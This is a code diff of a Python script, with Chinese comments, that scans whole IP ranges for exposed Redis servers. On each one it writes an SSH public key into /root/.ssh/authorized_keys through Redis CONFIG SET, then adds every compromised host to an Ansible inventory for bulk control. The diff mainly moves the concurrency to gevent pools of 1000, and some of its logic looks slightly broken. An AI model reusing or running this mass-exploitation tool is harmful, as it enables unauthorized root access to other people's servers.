@@ -1,10 +1,15 @@
 #!/py3/bin/python3
 # encoding:utf-8
 
-import socket,threadpool,time
+import socket,time,gevent
 from redis import StrictRedis
+from gevent.pool import Pool
+from gevent import monkey
 
-success_list = []
+monkey.patch_all()
+
+
+
 socket.setdefaulttimeout(0.5)  # 设置socker超时，单位秒
 key_pub = '''
 
@@ -32,7 +37,7 @@ def get_port_status(ip, port=6379):
 
 
 def start_redis(ip):
-    r = StrictRedis(host=ip, socket_timeout=0.5)
+    r = StrictRedis(host=ip, socket_timeout=0.3)
     try:
         key_info = r.set('key', key_pub)
         dir_info = r.config_set('dir','/root/.ssh')
@@ -41,37 +46,38 @@ def start_redis(ip):
             if respon != b'OK':
                 r.config_set('dbfilename','authorized_keys')
                 r.save()
-                print('\033[0;33;44m Ok \033[0m')
                 redis_success.append(ip)
             else:
-                print('false')
+                pass
+           
     except:
-        print('false')
         pass
 
 
 
 
 if __name__ == '__main__':
-    #start_ip = '39.104.'
-    start_ip = str(input('input start ip >>: ')) + '.'
-    ip_addr = []
-    redis_success = []
-    print("please wait...")
-    for three_ip in range(0, 256):
-        for end_ip in range(0, 255):
-            ip = start_ip + str(three_ip) + '.' + str(end_ip)
-            ip_addr.append(ip)             #生成所有ip地址
+	
+	redis_success = []  #redis端口存活的IP
+	success_list = []   #成功攻击的IP
+	
+	start_ip = str(input('input start ip >>: ')) + '.'
+			
+	ip_pool=Pool(1000)  #ip
+	for three_ip in range(0, 256):
+		for end_ip in range(0, 255):
+			ip = start_ip + str(three_ip) + '.' + str(end_ip)
+			ip_threads = [ip_pool.spawn(get_port_status, ip)]
+	gevent.joinall(ip_threads)
 
-    pool = threadpool.ThreadPool(1004)
-    check_port = threadpool.makeRequests(get_port_status, ip_addr)  # 开启多线程
-    for req in check_port:
-        pool.putRequest(req)
-    pool.wait()                        #等待线程结束
+	redis_pool=Pool(1000)  #redis
+	redis_threads = [redis_pool.spawn(start_redis, data) for data in success_list]
+	gevent.joinall(redis_threads)
 
-    for data in success_list:       #测试redis
-        print(data,end='...')
-        start_redis(data)
-
-    print('成功IP共%s个:\n'%(len(redis_success)),redis_success)
-
+	print('成功IP共%s个:\n'%(len(redis_success)),redis_success)
+	if redis_success is None:
+		pass
+	else:
+		for host in redis_success:
+			with open('/etc/ansible/hosts','a+') as f:
+				f.write(str(host)+'\n')
